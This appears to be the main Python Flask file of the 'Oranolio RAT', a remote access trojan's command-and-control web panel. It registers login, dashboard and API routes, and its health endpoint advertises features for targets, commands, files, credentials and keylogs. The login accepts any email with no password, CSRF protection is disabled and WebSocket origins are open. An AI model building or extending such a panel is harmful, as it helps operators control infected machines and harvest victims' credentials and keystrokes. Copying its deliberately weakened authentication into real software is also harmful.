#!/usr/bin/env python3
"""
Oranolio RAT - Complete Integrated Application
Uses all existing components: production dashboard, auth system, API routes
"""

import os
import sys
from pathlib import Path

# Add current directory to path
sys.path.insert(0, str(Path(__file__).parent))
sys.path.insert(0, str(Path(__file__).parent / 'Core'))

# Load environment
try:
    from dotenv import load_dotenv
    load_dotenv()
except:
    pass

# Setup production logging
from production_logging import setup_production_logging
setup_production_logging()

from flask import Flask, redirect, url_for, session
from flask_socketio import SocketIO
from flask_wtf.csrf import CSRFProtect
import secrets

# Create Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', secrets.token_hex(32))
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB
app.config['WTF_CSRF_ENABLED'] = False  # Disabled for easier testing
app.config['WTF_CSRF_TIME_LIMIT'] = None

# Initialize extensions
csrf = CSRFProtect(app)
csrf._exempt_views.add('auth.login')
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Import and register blueprints
# Use simple email-only auth instead of complex password auth
from flask import Blueprint, render_template, request, flash, g
import sqlite3
from datetime import datetime

auth_bp = Blueprint('auth', __name__)

@auth_bp.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email', '').strip().lower()
        if email:
            # Store in database
            try:
                db_path = Path('data/email_auth.db')
                conn = sqlite3.connect(str(db_path))
                cursor = conn.cursor()
                
                # Check if user exists
                cursor.execute('SELECT id FROM email_auth WHERE email = ?', (email,))
                user = cursor.fetchone()
                
                if user:
                    user_id = user[0]
                    cursor.execute(
                        'UPDATE email_auth SET last_login = ?, last_ip = ? WHERE email = ?',
                        (datetime.now(), request.remote_addr, email)
                    )
                else:
                    cursor.execute(
                        'INSERT INTO email_auth (email, is_verified, created_at, last_ip) VALUES (?, 1, ?, ?)',
                        (email, datetime.now(), request.remote_addr)
                    )
                    user_id = cursor.lastrowid
                
                conn.commit()
                conn.close()
                
                # Set session
                session['authenticated'] = True
                session['email'] = email
                session['username'] = email.split('@')[0]
                session['user_id'] = user_id
                
                flash(f'Welcome, {email}!', 'success')
                return redirect('/dashboard')
            except Exception as e:
                print(f"[!] Login error: {e}")
                flash('Login error occurred', 'error')
        else:
            flash('Please enter an email address', 'error')
    
    return render_template('login.html')

@auth_bp.route('/logout')
def logout():
    session.clear()
    flash('You have been logged out', 'info')
    return redirect('/login')

app.register_blueprint(auth_bp)
print("[✓] Registered simple email auth routes")

# Register the complete dashboard routes (only one dashboard system)
try:
    from complete_dashboard_routes import dashboard_bp
    app.register_blueprint(dashboard_bp)
    print("[✓] Registered complete dashboard routes")
except Exception as e:
    print(f"[✗] Failed to register dashboard routes: {e}")
    import traceback
    traceback.print_exc()

try:
    # API routes
    from api_routes import api_bp
    app.register_blueprint(api_bp)
    print("[✓] Registered API routes")
except Exception as e:
    print(f"[!] Could not register api_routes: {e}")

# Root route
@app.route('/')
def index():
    if session.get('authenticated'):
        return redirect('/dashboard')
    return redirect('/login')

# Health check
@app.route('/health')
def health():
    return {
        'status': 'healthy',
        'version': '2.0',
        'features': [
            'authentication',
            'dashboard',
            'targets',
            'commands',
            'files',
            'credentials',
            'keylogs',
            'api'
        ]
    }

# WebSocket handlers
@socketio.on('connect')
def handle_connect():
    print(f'[WebSocket] Client connected: {request.sid}')

@socketio.on('disconnect')
def handle_disconnect():
    print(f'[WebSocket] Client disconnected: {request.sid}')

if __name__ == '__main__':
    print('=' * 70)
    print('ORANOLIO RAT - FULL INTEGRATED APPLICATION')
    print('=' * 70)
    print('[*] Loading all components...')
    print('=' * 70)
    
    host = os.getenv('STITCH_HOST', '0.0.0.0')
    port = int(os.getenv('STITCH_PORT', 3000))
    
    print(f'[*] Starting server on {host}:{port}')
    print(f'[*] Access: http://localhost:{port}')
    print(f'[*] Login: Use any email address')
    print('=' * 70)
    
    socketio.run(app, host=host, port=port, debug=False, allow_unsafe_werkzeug=True)
